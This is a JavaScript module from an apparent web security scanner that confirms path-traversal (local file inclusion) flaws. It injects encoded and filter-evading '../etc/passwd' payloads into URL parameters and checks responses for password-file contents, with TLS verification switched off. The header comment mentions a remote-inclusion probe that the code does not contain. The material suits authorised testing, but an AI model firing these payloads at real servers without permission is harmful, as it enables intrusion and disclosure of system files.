const { BaseModule, ModuleResult } = require('./base');
const { pushInsecureTLS, popInsecureTLS } = require('../tls_guard');
const { dedupParamUrls, dedupByEndpointParam } = require('./ssti_confirm');

// Path-traversal payloads (plain, filter-evasion, double-encoded) read against a
// /etc/passwd signature. RFI is probed with a remote marker URL.
const PAYLOADS = [
  '../../../../../../etc/passwd',
  '....//....//....//....//....//etc/passwd',
  '..%252f..%252f..%252f..%252f..%252fetc/passwd',
  '/etc/passwd',
  '..\\/..\\/..\\/..\\/etc/passwd',
];
const SIG = /root:.*?:0:0:/;

class LfiConfirm extends BaseModule {
  static moduleName = 'lfi_confirm';
  static phase = 'P6c';
  static toolsNeeded = [];

  async execute() {
    const targets = dedupParamUrls(this.workspace, this.scope);
    if (!targets.length) return new ModuleResult({ module: LfiConfirm.moduleName, status: 'skipped', errors: ['No parameterized URLs'] });
    const ua = this.config.user_agent || 'WebKiller/3.0';
    const confirmed = [];
    pushInsecureTLS();
    try {
      for (const url of targets.slice(0, this.config.lfi_max_urls || 40)) {
        let parsed; try { parsed = new URL(url); } catch { continue; }
        // Baseline guard: skip endpoints that already echo a passwd-like body.
        try { const b = await fetch(url, { headers: { 'User-Agent': ua }, signal: AbortSignal.timeout(8000) }); if (SIG.test(await b.text())) continue; } catch { /* keep going */ }
        let hit = false;
        for (const pName of [...parsed.searchParams.keys()]) {
          for (const pl of PAYLOADS) {
            try {
              // Keep double-encoding intact: set via raw search string, not searchParams.
              const t = new URL(url);
              t.search = buildSearch(parsed, pName, pl);
              const resp = await fetch(t.href, { headers: { 'User-Agent': ua }, signal: AbortSignal.timeout(8000) });
              const body = await resp.text();
              if (SIG.test(body)) {
                confirmed.push({ name: `LFI (path traversal): ${pName}`, severity: 'high', url, evidence: { param: pName, payload: pl, matched: '/etc/passwd', note: 'server returned /etc/passwd contents' }, type: 'dast_confirmed', vuln_class: 'lfi', module: LfiConfirm.moduleName });
                hit = true; break;
              }
            } catch { /* skip */ }
          }
          if (hit) break;
        }
      }
    } finally { popInsecureTLS(); }
    const out = dedupByEndpointParam(confirmed);
    if (out.length) { this.workspace.appendJsonl('confirmed.jsonl', out); this.workspace.appendJsonl('findings.jsonl', out); }
    return new ModuleResult({ module: LfiConfirm.moduleName, items: out.map(c => c.url), records: out, toolUsed: 'traversal-probe' });
  }
}

// Rebuild the query string, replacing one param's value with a payload that must
// NOT be re-encoded (so %252f survives to reach a double-decode).
function buildSearch(parsedUrl, targetParam, rawValue) {
  const parts = [];
  for (const [k, v] of parsedUrl.searchParams.entries()) {
    if (k === targetParam) parts.push(`${encodeURIComponent(k)}=${rawValue}`);
    else parts.push(`${encodeURIComponent(k)}=${encodeURIComponent(v)}`);
  }
  return '?' + parts.join('&');
}

module.exports = LfiConfirm;
